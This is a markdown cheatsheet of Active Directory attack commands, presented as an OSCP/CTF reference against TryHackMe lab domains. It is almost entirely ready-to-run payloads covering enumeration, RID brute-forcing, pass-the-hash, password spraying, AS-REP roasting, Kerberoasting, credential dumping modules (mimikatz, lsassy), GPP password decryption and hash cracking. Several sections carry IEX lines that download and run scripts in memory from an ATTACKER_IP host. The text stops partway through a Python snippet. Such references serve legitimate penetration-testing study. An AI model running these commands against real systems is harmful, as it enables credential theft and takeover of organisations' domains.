# 🔴 Active Directory Enumeration — Complete Payload Cheatsheet
> **OSCP/CRTP/CTF Quick Reference** | Every payload, every tool, every technique

---

## 📌 TABLE OF CONTENTS

| # | Section |
|---|---------|
| 1 | [Credential Injection (Runas)](#1-credential-injection--runas) |
| 2 | [Network & Port Scanning](#2-network--port-scanning) |
| 3 | [DNS Enumeration](#3-dns-enumeration) |
| 4 | [SMB Enumeration](#4-smb-enumeration) |
| 5 | [LDAP Enumeration](#5-ldap-enumeration) |
| 6 | [RPC Enumeration](#6-rpc-enumeration) |
| 7 | [NET Commands](#7-net-commands-windows-built-in) |
| 8 | [PowerShell AD Cmdlets](#8-powershell-ad-cmdlets) |
| 9 | [PowerView](#9-powerview) |
| 10 | [CrackMapExec / NetExec](#10-crackmapexec--netexec) |
| 11 | [Kerbrute](#11-kerbrute) |
| 12 | [BloodHound / SharpHound](#12-bloodhound--sharphound) |
| 13 | [AS-REP Roasting](#13-as-rep-roasting) |
| 14 | [Kerberoasting](#14-kerberoasting) |
| 15 | [SYSVOL / GPP Passwords](#15-sysvol--gpp-passwords) |
| 16 | [LAPS Enumeration](#16-laps-enumeration) |
| 17 | [ACL Enumeration](#17-acl-enumeration) |
| 18 | [Delegation Enumeration](#18-delegation-enumeration) |
| 19 | [Trust Enumeration](#19-trust-enumeration) |
| 20 | [Session Hunting](#20-session-hunting) |
| 21 | [Share Enumeration](#21-share-enumeration) |
| 22 | [Local Admin Mapping](#22-local-admin-mapping) |
| 23 | [Password Spraying](#23-password-spraying) |
| 24 | [Living Off the Land (LOL)](#24-living-off-the-land-lol) |
| 25 | [enum4linux / enum4linux-ng](#25-enum4linux--enum4linux-ng) |
| 26 | [WinRM Enumeration](#26-winrm-enumeration) |
| 27 | [Hash Cracking Reference](#27-hash-cracking-reference) |
| 28 | [Important Ports Reference](#28-important-ports-reference) |
| 29 | [OSCP Exam Quick Flow](#29-oscp-exam-quick-flow) |
| 30 | [Cypher Queries (BloodHound)](#30-cypher-queries-bloodhound) |

---

## 1. Credential Injection — Runas

> **Use:** You have creds but no domain-joined machine. Inject into memory.

```cmd
# Inject credentials into new CMD window
runas.exe /netonly /user:DOMAIN\username cmd.exe

# FQDN format (recommended)
runas.exe /netonly /user:za.tryhackme.com\john.doe cmd.exe

# Verify creds worked — list SYSVOL (any AD user can read this)
dir \\za.tryhackme.com\SYSVOL\

# Set DNS to DC manually (PowerShell)
$dnsip = "10.10.10.5"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip

# Verify DNS resolves
nslookup za.tryhackme.com
```

> ⚡ `/netonly` = local commands run as YOU, network commands run as injected user. DC does NOT verify password locally — wrong password still accepted until you hit a network resource.

---

## 2. Network & Port Scanning

> **Use:** Find DCs, identify AD infrastructure, OS versions.

```bash
# Quick DC discovery (key AD ports)
nmap -sS -p 53,88,135,139,389,445,464,636,3268,3269,5985,3389 10.10.10.0/24

# DC fingerprint (all ports + service versions)
nmap -sS -sV -A -p- 10.10.10.5 -oA dc_full

# Find all open hosts
nmap -sn 10.10.10.0/24

# SMB signing check (for relay attacks)
nmap --script smb2-security-mode -p 445 10.10.10.0/24

# SMB vulnerability scan (EternalBlue)
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5

# LDAP info
nmap --script ldap-rootdse -p 389 10.10.10.5

# Kerberos user enum via nmap
nmap --script krb5-enum-users \
  --script-args krb5-enum-users.realm='domain.com',userdb=users.txt \
  -p 88 10.10.10.5

# Generate SMB relay target list (signing=False)
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

> 🎯 DC Identifier: Ports **88 + 389 + 445** all open on same host = Domain Controller

---

## 3. DNS Enumeration

> **Use:** Find internal hostnames, discover DCs via SRV records, zone transfer.

```bash
# Zone transfer attempt (AXFR) — huge info if allowed
dig @10.10.10.5 za.tryhackme.com AXFR
dig @10.10.10.5 za.tryhackme.com ANY

# nslookup zone transfer
nslookup
> server 10.10.10.5
> ls -d za.tryhackme.com

# Find Domain Controllers via SRV records
nslookup -type=SRV _ldap._tcp.za.tryhackme.com 10.10.10.5
nslookup -type=SRV _kerberos._tcp.za.tryhackme.com 10.10.10.5
dig @10.10.10.5 _ldap._tcp.za.tryhackme.com SRV
dig @10.10.10.5 _kerberos._tcp.za.tryhackme.com SRV

# dnsrecon full enum
dnsrecon -d za.tryhackme.com -n 10.10.10.5 -t axfr
dnsrecon -d za.tryhackme.com -n 10.10.10.5 -t std
dnsrecon -d za.tryhackme.com -n 10.10.10.5 -t brt -D /usr/share/wordlists/dnsmap.txt

# dnsenum
dnsenum --dnsserver 10.10.10.5 za.tryhackme.com

# fierce
fierce --domain za.tryhackme.com --dns-servers 10.10.10.5

# Reverse lookup
nmap -sn -R 10.10.10.0/24 --dns-servers 10.10.10.5
```

---

## 4. SMB Enumeration

> **Use:** Find shares, OS info, users, null sessions, relay targets.

```bash
# Basic SMB info (OS, hostname, domain, signing)
crackmapexec smb 10.10.10.5
crackmapexec smb 10.10.10.0/24

# Null session check
smbclient -L //10.10.10.5 -N
smbmap -H 10.10.10.5

# Authenticated share list
smbclient -L //10.10.10.5 -U "john.doe%Password123"
smbmap -H 10.10.10.5 -u john.doe -p 'Password123'
crackmapexec smb 10.10.10.5 -u john.doe -p 'Password123' --shares

# Connect to share
smbclient //10.10.10.5/Finance -U "john.doe%Password123"

# Inside smbclient
smb: \> ls
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
smb: \> get passwords.xlsx
smb: \> put shell.exe

# smbmap recursive listing with permissions
smbmap -H 10.10.10.5 -u john.doe -p 'Password123' -R

# Read a file without downloading
smbmap -H 10.10.10.5 -u john.doe -p 'Password123' \
  --file-pattern '*.txt' -R

# SMB relay target list
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# NTLM hash authentication (Pass-the-Hash)
smbclient //10.10.10.5/C$ -U Administrator \
  --pw-nt-hash aad3b435b51404eeaad3b435b51404ee
```

---

## 5. LDAP Enumeration

> **Use:** Query AD database directly — users, groups, policies, SPNs, everything.

```bash
# Anonymous LDAP bind (sometimes allowed)
ldapsearch -x -H ldap://10.10.10.5 -b "DC=za,DC=tryhackme,DC=com"

# Authenticated — all users
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(objectClass=user)" \
  cn sAMAccountName description memberOf pwdLastSet

# All groups
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(objectClass=group)" cn member

# Domain Admins members
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com" \
  "(objectClass=*)" member

# Kerberoastable accounts (SPN set)
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  cn sAMAccountName servicePrincipalName

# AS-REP Roastable (No preauth)
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
  cn sAMAccountName

# Password policy
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(objectClass=domain)" \
  pwdHistoryLength lockoutThreshold maxPwdAge minPwdLength

# All computers
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(objectClass=computer)" \
  cn operatingSystem lastLogon

# Disabled accounts
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=2)" \
  cn sAMAccountName

# Unconstrained delegation
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  cn sAMAccountName

# LAPS — read ms-mcs-admpwd (if permission)
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john.doe@za.tryhackme.com" -w 'Password123' \
  -b "DC=za,DC=tryhackme,DC=com" \
  "(objectClass=computer)" \
  cn ms-mcs-admpwd ms-mcs-admpwdexpirationtime
```

### LDAP Filter Reference

| Filter | Finds |
|--------|-------|
| `(objectClass=user)` | All users |
| `(objectClass=group)` | All groups |
| `(objectClass=computer)` | All computers |
| `(objectClass=domain)` | Domain object |
| `(adminCount=1)` | Privileged accounts |
| `(servicePrincipalName=*)` | Kerberoastable |
| `(UAC:...=4194304)` | AS-REP Roastable |
| `(UAC:...=524288)` | Unconstrained delegation |
| `(UAC:...=2)` | Disabled accounts |

---

## 6. RPC Enumeration

> **Use:** Enumerate users/groups via RPC — null session often works!

```bash
# Connect — null session
rpcclient -U "" -N 10.10.10.5

# Connect — authenticated
rpcclient -U "john.doe%Password123" 10.10.10.5

# One-liner (no interactive)
rpcclient -U "john.doe%Password123" 10.10.10.5 -c "enumdomusers"

# Commands inside rpcclient shell
rpcclient $> srvinfo              # Server OS info
rpcclient $> enumdomusers         # All users + RIDs
rpcclient $> enumdomgroups        # All groups
rpcclient $> enumdomains          # All domains
rpcclient $> querydominfo         # Domain info
rpcclient $> getdompwinfo         # Password policy
rpcclient $> querydispinfo        # Detailed user list
rpcclient $> queryuser 0x1f4      # User by RID (0x1f4=500=Admin)
rpcclient $> querygroup 0x200     # Group by RID (0x200=512=DA)
rpcclient $> querygroupmem 0x200  # Group members
rpcclient $> lookupsids S-1-5-21-...-500   # SID to username
rpcclient $> lookupnames john.doe           # Username to SID
rpcclient $> netshareenumall      # All shares

# RID brute-force — username enumeration
for i in $(seq 500 1200); do
  rpcclient -U "" -N 10.10.10.5 \
    -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | \
    grep "User Name\|user_rid"
done
```

---

## 7. NET Commands (Windows Built-in)

> **Use:** Quick enum from CMD — no tools needed, low noise, works in phishing payloads.

```cmd
# === USERS ===
net user /domain                          # All domain users
net user john.doe /domain                 # Specific user details
net user /domain | findstr /i "admin"     # Filter admin users

# === GROUPS ===
net group /domain                         # All domain groups
net group "Domain Admins" /domain         # DA members
net group "Enterprise Admins" /domain     # EA members
net group "Schema Admins" /domain         # SA members
net group "Tier 0 Admins" /domain         # Custom admin group
net localgroup Administrators             # Local admins on current box

# === DOMAIN INFO ===
net accounts /domain                      # Password policy
net view /domain                          # Computers in domain
net view \\10.10.10.5                     # Shares on specific host

# === MISC ===
net share                                 # Local shares
net use                                   # Mapped drives
net session                               # Active sessions (if admin)
net time /domain                          # Domain time sync

# === COMPUTER ENUM ===
net view /domain:za.tryhackme.com         # All machines in domain
```

---

## 8. PowerShell AD Cmdlets

> **Use:** Powerful built-in AD queries — more detail than net commands.

```powershell
# Load AD module (requires RSAT)
Import-Module ActiveDirectory

# === USERS ===
# All users
Get-ADUser -Filter * -Server DC_IP -Properties *

# Specific user — all properties
Get-ADUser -Identity john.doe -Server DC_IP -Properties *

# Filter by name pattern
Get-ADUser -Filter 'Name -like "*admin*"' -Server DC_IP | 
  Select Name,SamAccountName

# Kerberoastable (SPN set)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Server DC_IP `
  -Properties ServicePrincipalName | 
  Select Name,SamAccountName,ServicePrincipalName

# AS-REP Roastable (no preauth)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Server DC_IP `
  -Properties DoesNotRequirePreAuth

# Privileged accounts (AdminCount=1)
Get-ADUser -Filter {AdminCount -eq 1} -Server DC_IP -Properties AdminCount |
  Select Name,SamAccountName

# Password never expires
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Server DC_IP |
  Select Name,SamAccountName,Enabled

# Stale accounts (no login > 90 days)
Get-ADUser -Filter * -Server DC_IP -Properties LastLogonDate |
  Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} |
  Select Name,SamAccountName,LastLogonDate

# Locked out accounts
Get-ADUser -Filter {LockedOut -eq $true} -Server DC_IP |
  Select Name,SamAccountName

# Users with description (check for passwords!)
Get-ADUser -Filter * -Server DC_IP -Properties Description |
  Where-Object {$_.Description -ne $null} |
  Select Name,SamAccountName,Description

# Bad password count (avoid spraying these near lockout)
Get-ADObject -Filter 'badPwdCount -gt 0' -Server DC_IP

# Recently changed objects
$Date = New-Object DateTime(2023, 01, 01, 0, 0, 0)
Get-ADObject -Filter 'whenChanged -gt $Date' -includeDeletedObjects -Server DC_IP

# === GROUPS ===
Get-ADGroup -Filter * -Server DC_IP | Select Name,GroupScope,GroupCategory
Get-ADGroup -Identity "Domain Admins" -Server DC_IP
Get-ADGroupMember -Identity "Domain Admins" -Server DC_IP
Get-ADGroupMember -Identity "Domain Admins" -Server DC_IP -Recursive
Get-ADGroup -Filter * -Server DC_IP -Properties AdminCount |
  Where-Object {$_.AdminCount -eq 1}

# Groups a user belongs to
Get-ADUser -Identity john.doe -Server DC_IP -Properties MemberOf | 
  Select -ExpandProperty MemberOf

# === COMPUTERS ===
Get-ADComputer -Filter * -Server DC_IP -Properties *
Get-ADComputer -Filter * -Server DC_IP -Properties OperatingSystem |
  Select Name,OperatingSystem,LastLogonDate

# Old OS — easy targets
Get-ADComputer -Filter {OperatingSystem -like "*2008*"} -Server DC_IP
Get-ADComputer -Filter {OperatingSystem -like "*2003*"} -Server DC_IP
Get-ADComputer -Filter {OperatingSystem -like "*XP*"} -Server DC_IP

# === DOMAIN ===
Get-ADDomain -Server DC_IP
Get-ADDomainController -Filter * -Server DC_IP
Get-ADForest
Get-ADTrust -Filter *

# === PASSWORD POLICY ===
Get-ADDefaultDomainPasswordPolicy -Server DC_IP
(Get-ADDomain -Server DC_IP).ReadOnlyReplicaDirectoryServers

# === MODIFY (if permissions allow) ===
# Force password change
Set-ADAccountPassword -Identity john.doe -Server DC_IP `
  -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) `
  -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

---

## 9. PowerView

> **Use:** Advanced AD recon — sessions, ACLs, shares, attack paths. Load in memory for OPSEC.

```powershell
# === LOAD ===
# From disk
. .\PowerView.ps1
Import-Module .\PowerView.ps1

# From memory (OPSEC — no disk touch)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Bypass execution policy
powershell -ep bypass -c "IEX (IWR http://ATTACKER_IP/PowerView.ps1 -UseBasicParsing)"

# === DOMAIN INFO ===
Get-NetDomain
Get-NetDomain -Domain other.domain.com
Get-NetDomainController
Get-NetForest
Get-NetForestDomain
Get-NetDomainTrust
Get-NetForestTrust

# === USERS ===
Get-NetUser
Get-NetUser -Username john.doe
Get-NetUser | Select cn,description,memberof,pwdlastset,logoncount,badpwdcount
Get-NetUser -SPN | Select samaccountname,serviceprincipalname   # Kerberoastable!
Get-NetUser -PreauthNotRequired                                   # AS-REP Roastable!
Get-NetUser -AdminCount | Select samaccountname,memberof         # Privileged!
Get-NetUser | Select samaccountname,description | Where {$_.description -ne $null}

# === GROUPS ===
Get-NetGroup
Get-NetGroup "Domain Admins"
Get-NetGroup -AdminCount
Get-NetGroupMember "Domain Admins" -Recurse
Get-NetGroup -UserName john.doe                    # What groups is john in?

# === COMPUTERS ===
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Ping                              # Only live hosts
Get-NetComputer -OperatingSystem "*2008*"          # Old OS

# === SESSION HUNTING ===
Get-NetSession -ComputerName DC-01
Get-NetLoggedon -ComputerName PC-01

# Where is Domain Admin logged in? (CRITICAL!)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-DomainUserLocation -UserName "t0_admin"

# === LOCAL ADMIN ===
Find-LocalAdminAccess                              # Where am I local admin?
Get-NetLocalGroup -ComputerName PC-01
Get-NetLocalGroupMember -ComputerName PC-01 -GroupName Administrators

# === SHARES ===
Invoke-ShareFinder -CheckShareAccess               # Accessible shares only
Invoke-ShareFinder -ExcludeStandard               # No ADMIN$, C$, IPC$
Invoke-FileFinder                                  # Interesting files

# === GPO ===
Get-NetGPO
Get-NetGPO -ComputerName PC-01
Get-DomainGPOLocalGroup                           # GPO-applied local admins
Get-DomainOU                                       # All OUs
Get-GPPPassword                                    # GPP cpassword — FREE CREDS!

# === ACLs ===
Get-ObjectAcl -SamAccountName john.doe -ResolveGUIDs
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | Where {$_.IdentityReferenceName -match "john.doe"}

# === DELEGATION ===
Get-NetComputer -Unconstrained                     # Unconstrained delegation
Get-NetUser -Unconstrained
Get-NetUser -TrustedToAuth                         # Constrained delegation
Get-NetComputer -TrustedToAuth

# === SPN ===
Get-NetUser -SPN
setspn -T domain.com -Q */*                       # Built-in Windows tool

# === SEARCH ===
Find-UserField -SearchField description -SearchTerm "password"
Find-UserField -SearchField description -SearchTerm "pass"
Find-UserField -SearchField description -SearchTerm "admin"
```

---

## 10. CrackMapExec / NetExec

> **Use:** Swiss army knife — enum, spray, exec, dump across SMB/LDAP/WinRM.

```bash
# === INSTALL ===
pip3 install crackmapexec
pip3 install netexec          # Newer replacement

# cme = crackmapexec, nxc = netexec (same syntax)

# === SMB — BASIC INFO ===
crackmapexec smb 10.10.10.5
crackmapexec smb 10.10.10.0/24                        # Full subnet

# === SMB — CREDENTIAL VALIDATION ===
crackmapexec smb 10.10.10.5 -u john.doe -p 'Password123'
crackmapexec smb 10.10.10.0/24 -u john.doe -p 'Password123'
# [+] = Valid | (Pwn3d!) = Local Admin!

# Hash auth (Pass-the-Hash)
crackmapexec smb 10.10.10.5 -u Administrator -H 'NTLM_HASH'
crackmapexec smb 10.10.10.5 -u Administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# === SMB — ENUMERATION ===
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --users
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --groups
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --shares
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --pass-pol
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --loggedon-users   # Session hunting!
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --local-groups
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --disks
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --sessions
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --rid-brute        # RID enum

# === SMB — RELAY LIST ===
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt
# signing=False hosts go into relay.txt

# === LDAP — ENUMERATION ===
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --users
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --groups
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --computers
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --admin-count     # AdminCount=1
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --trusted-for-delegation
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --get-sid

# === LDAP — ATTACK DISCOVERY ===
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --asreproast asrep.txt
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --kerberoasting kerb.txt

# === LDAP — LAPS ===
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' -M laps
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' -M laps -o TARGET=PC-01

# === WINRM ===
crackmapexec winrm 10.10.10.5 -u john -p 'Pass'
# (Pwn3d!) = WinRM shell possible via evil-winrm

# === MSSQL ===
crackmapexec mssql 10.10.10.5 -u john -p 'Pass' -q "SELECT @@version"

# === MODULES ===
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M mimikatz
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M gpp_password
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M lsassy
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M nanodump
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M enum_av         # AV detection
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M spider_plus     # File spider

# List all modules
crackmapexec smb -L
crackmapexec ldap -L

# === OUTPUT ===
crackmapexec smb 10.10.10.0/24 -u john -p 'Pass' --users \
  2>/dev/null | grep -v '\[-\]'                              # Filter failed only
```

---

## 11. Kerbrute

> **Use:** Kerberos-based username enum + password spray. Less noisy than SMB (Event 4768 vs 4625).

```bash
# === INSTALL ===
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64 && mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# === USERNAME ENUMERATION (unauthenticated!) ===
kerbrute userenum --dc 10.10.10.5 -d za.tryhackme.com usernames.txt
kerbrute userenum --dc 10.10.10.5 -d domain.com /usr/share/seclists/Usernames/Names/names.txt
kerbrute userenum --dc 10.10.10.5 -d domain.com users.txt -o valid_users.txt

# === PASSWORD SPRAY ===
kerbrute passwordspray --dc 10.10.10.5 -d domain.com users.txt 'Password123!'
kerbrute passwordspray --dc 10.10.10.5 -d domain.com users.txt 'Company@2024'
kerbrute passwordspray --dc 10.10.10.5 -d domain.com users.txt 'Summer2024!'
kerbrute passwordspray --dc 10.10.10.5 -d domain.com users.txt 'Welcome1'
# --safe: stops on lockout detection

# === BRUTE FORCE single user ===
kerbrute bruteuser --dc 10.10.10.5 -d domain.com john.doe passwords.txt

# === OUTPUT FORMAT ===
# [+] VALID USERNAME: john.doe@domain.com
# [+] VALID LOGIN: john.doe@domain.com:Password123!
# [+] VALID LOGIN WITH PREAUTH NOT REQUIRED: jane → AS-REP Roast this!
```

---

## 12. BloodHound / SharpHound

> **Use:** Graph-based attack path visualization — find DA path from any user.

```bash
# === SHARPHOUND (Windows — data collection) ===

# Full collection (run at assessment start)
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs

# Session only (run 2x daily — 10AM and 2PM)
SharpHound.exe --CollectionMethods Session --Domain za.tryhackme.com --ExcludeDCs

# Specific collection methods
SharpHound.exe --CollectionMethods Group,ACL,Trusts,LocalAdmin,ObjectProps --ExcludeDCs

# Stealth mode
SharpHound.exe --CollectionMethods All --Stealth --ExcludeDCs

# Custom output
SharpHound.exe --CollectionMethods All --ZipPassword infected --OutputDirectory C:\Temp --OutputPrefix corp

# From PowerShell (memory load)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain za.tryhackme.com -ExcludeDCs

# === BLOODHOUND-PYTHON (Linux — remote collection) ===
pip3 install bloodhound

# Full collection
bloodhound-python -u john.doe -p 'Password123' \
  -d za.tryhackme.com -dc THMDC.za.tryhackme.com -c All

# With IP (no DNS)
bloodhound-python -u john.doe -p 'Password123' \
  -d za.tryhackme.com -dc 10.10.10.5 -c All --dns-tcp

# Hash auth
bloodhound-python -u john.doe --hashes ':NTLM_HASH' \
  -d domain.com -dc 10.10.10.5 -c All

# Specific collection
bloodhound-python -u john.doe -p 'Pass' -d domain.com \
  -dc 10.10.10.5 -c Group,Session,ACL,Trusts --zip

# Specific OU only
bloodhound-python -u john.doe -p 'Pass' -d domain.com \
  -dc 10.10.10.5 -c All \
  --search-base "OU=IT,DC=domain,DC=com"

# === BLOODHOUND GUI — SETUP ===
sudo neo4j start
bloodhound --no-sandbox &
# Default: neo4j:neo4j

# Import: drag ZIP onto BH window

# === BLOODHOUND — WORKFLOW ===
# 1. Import ZIP
# 2. Search your user → Right-click → Mark as Owned
# 3. Analysis tab → "Shortest Paths to Domain Admins"
# 4. Analysis tab → "Shortest Paths from Owned Principals to DA"
# 5. Click each edge → Help button → Exploitation guide!

# === SESSION DATA STRATEGY ===
# Before importing new sessions:
# Database Info → "Clear Session Information" → Import new
```

### SharpHound Collection Methods Reference

| Method | Collects | Noise |
|--------|----------|-------|
| `All` | Everything | Very High |
| `Default` | Groups, Sessions, ACLs | High |
| `Group` | Group memberships | Low |
| `Session` | Active logon sessions | Medium |
| `ACL` | Permission ACEs | Low |
| `LocalAdmin` | Local admin rights | Medium |
| `GPOLocalGroup` | GPO-applied local admins | Medium |
| `Trusts` | Domain trusts | Low |
| `Container` | OU structure | Low |
| `ObjectProps` | Object properties | Low |
| `SPNTargets` | Kerberoast targets | Low |

---

## 13. AS-REP Roasting

> **Use:** Accounts with "Do not require Kerberos preauthentication" — get hash without password, crack offline.

```bash
# === DISCOVERY ===

# PowerView
Get-NetUser -PreauthNotRequired | Select samaccountname

# AD Cmdlet
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Server DC_IP

# CrackMapExec
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --asreproast asrep.txt

# BloodHound Cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# === EXPLOIT (Linux) ===

# Unauthenticated (username list)
GetNPUsers.py za.tryhackme.com/ \
  -usersfile users.txt \
  -dc-ip 10.10.10.5 \
  -no-pass \
  -format hashcat

# Authenticated (auto-discover targets)
GetNPUsers.py za.tryhackme.com/john.doe:Password123 \
  -dc-ip 10.10.10.5 \
  -format hashcat \
  -outputfile asrep_hashes.txt

# Hash auth
GetNPUsers.py domain.com/john --hashes ':NTLM' \
  -dc-ip 10.10.10.5 -format hashcat

# === EXPLOIT (Windows) ===

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:svc-backup /format:hashcat /outfile:asrep.txt

# PowerView + Invoke-ASREPRoast
IEX (IWR http://ATTACKER/ASREPRoast.ps1)
Invoke-ASREPRoast -Format hashcat | Out-File asrep.txt

# === CRACK ===
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

> 📌 Hash format: `$krb5asrep$23$username@DOMAIN.COM:...`

---

## 14. Kerberoasting

> **Use:** Request service tickets for SPN accounts → encrypted with service account hash → crack offline.

```bash
# === DISCOVERY ===

# PowerView
Get-NetUser -SPN | Select samaccountname,serviceprincipalname

# AD Cmdlet
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} \
  -Properties ServicePrincipalName | Select Name,SamAccountName,ServicePrincipalName

# Built-in Windows (no tools!)
setspn -T za.tryhackme.com -Q */*

# CrackMapExec
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --kerberoasting kerb.txt

# BloodHound Cypher
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

# === EXPLOIT (Linux) ===
GetUserSPNs.py za.tryhackme.com/john.doe:Password123 \
  -dc-ip 10.10.10.5 \
  -outputfile kerb_hashes.txt

# Just list SPNs (no hash request)
GetUserSPNs.py za.tryhackme.com/john.doe:Password123 \
  -dc-ip 10.10.10.5

# Request hash for specific SPN
GetUserSPNs.py za.tryhackme.com/john.doe:Password123 \
  -dc-ip 10.10.10.5 \
  -request-user svc-sql

# === EXPLOIT (Windows) ===

# Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
Rubeus.exe kerberoast /user:svc-sql /format:hashcat /outfile:kerb.txt
Rubeus.exe kerberoast /rc4opsec /format:hashcat /outfile:kerb.txt

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerb.txt

# === CRACK ===
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
```

> 📌 Hash format: `$krb5tgs$23$*username$DOMAIN$SPN*:...`

---

## 15. SYSVOL / GPP Passwords

> **Use:** SYSVOL readable by all AD users — GPP XML files may contain AES-encrypted passwords. Key is public = free plaintext.

```bash
# === SYSVOL ACCESS ===

# Linux
smbclient //10.10.10.5/SYSVOL -U "john.doe%Password123"
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# CME spider
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M spider_plus \
  -o READ_ONLY=false

# Mount SYSVOL
sudo mount -t cifs //10.10.10.5/SYSVOL /mnt/sysvol \
  -o username=john.doe,password=Password123,domain=za.tryhackme.com

# Windows
net use \\10.10.10.5\SYSVOL /user:domain\john.doe Password123
dir \\za.tryhackme.com\SYSVOL\ /s

# === HUNT FOR PASSWORDS ===

# Find cpassword in XML files (Linux)
grep -ri "cpassword" /mnt/sysvol/
grep -ri "cpassword" . --include="*.xml"
find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;

# Find credentials in scripts
grep -ri "password" /mnt/sysvol/ --include="*.bat"
grep -ri "password" /mnt/sysvol/ --include="*.ps1"
grep -ri "password" /mnt/sysvol/ --include="*.vbs"

# === DECRYPT ===

# gpp-decrypt (Kali built-in)
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw+iX9A"

# Python decrypt
python3 -c "
import base64, hashlib
from Crypto.Cipher import AES
